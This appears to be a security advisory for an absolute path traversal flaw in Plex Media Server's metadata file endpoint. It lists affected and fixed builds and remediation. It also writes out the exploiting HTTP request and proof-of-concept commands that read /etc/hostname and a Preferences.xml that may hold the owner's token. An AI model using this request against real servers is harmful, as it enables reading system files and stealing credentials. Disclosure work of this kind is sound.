# Arbitrary server-side file read through the metadata endpoint

## Summary

Plex Media Server accepts a client-supplied `file://` URL in
`GET /library/metadata/{ratingKey}/file`. After confirming that the rating key
exists and is visible to the requester, vulnerable builds return any regular
file readable by the Plex service account instead of constraining the resolved
path to the selected item's media or metadata bundle.

## Classification

- Product: Plex Media Server
- Affected build confirmed: `1.43.3.10861-07dfddaeb`
- Also reproduced on: `1.43.3.10828-00f62d37d`
- Fixed build confirmed: `1.43.3.10896-cb3ebc72d`
- CVE: not assigned as of 2026-09-10
- Primary weakness: CWE-36, Absolute Path Traversal
- Related weakness: CWE-73, External Control of File Name or Path
- Authentication: confirmed with a local-administrator token; managed and shared-user tokens were not tested

## Technical details

The vulnerable request is:

```http
GET /library/metadata/1/file?url=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1
Host: plex.example:32400
X-Plex-Token: TOKEN
```

The following data flow is inferred from request behavior and binary patch
strings. Plex Media Server source code is not available.

```text
ratingKey -> authorize/resolve library item
url       -> parse file:// reference
path      -> open without enforcing selected bundle root
file      -> HTTP response
```

Differential tests show that the fixed build rejects direct filesystem
references. Its binary contains strings consistent with scheme validation and
canonical bundle containment:

```text
[Library] Rejecting metadata file request for unsupported media reference: %s
[Library] Rejecting metadata file request that escapes the bundle directory: %s
[Library] Ignoring media reference that escapes its bundle directory: %s
```

Implementation references:

- `file://` reference construction: [`poc.py`](poc.py#L41)
- endpoint construction: [`poc.py`](poc.py#L43)
- HTTP request: [`poc.py`](poc.py#L51)
- binary-safe output handling: [`poc.py`](poc.py#L61)

## Impact

The requester can read files with the filesystem privileges of the Plex
service account. Confirmed targets in the isolated lab included:

- `/etc/hostname`
- Plex `Preferences.xml`
- the Plex library SQLite database

`Preferences.xml` may contain the server owner's Plex token. The endpoint's
behavior with managed or shared-user tokens was not tested. No cross-user
privilege escalation is claimed.

## Proof of concept

Requirements:

- Python 3.8 or later
- a local-administrator Plex token
- the rating key of a library item on the test server

Print a remote file to stdout:

```bash
python3 poc.py \
  --url http://127.0.0.1:32400 \
  --rating-key 1 \
  --token TOKEN \
  --file /etc/hostname
```

Save the response without corrupting binary data:

```bash
python3 poc.py \
  --url http://127.0.0.1:32400 \
  --rating-key 1 \
  --token TOKEN \
  --file '/config/Library/Application Support/Plex Media Server/Preferences.xml' \
  --output Preferences.xml
```

Expected result on `1.43.3.10861-07dfddaeb`: HTTP 200 and the requested file
contents. Expected result on `1.43.3.10896-cb3ebc72d`: HTTP error, with no
target-file content returned.

## Remediation

Upgrade to Plex Media Server `1.43.3.10896-cb3ebc72d` or later. Implementations
should reject direct filesystem schemes, canonicalize resolved paths, and
require the final path to remain under the bundle associated with the requested
library item.
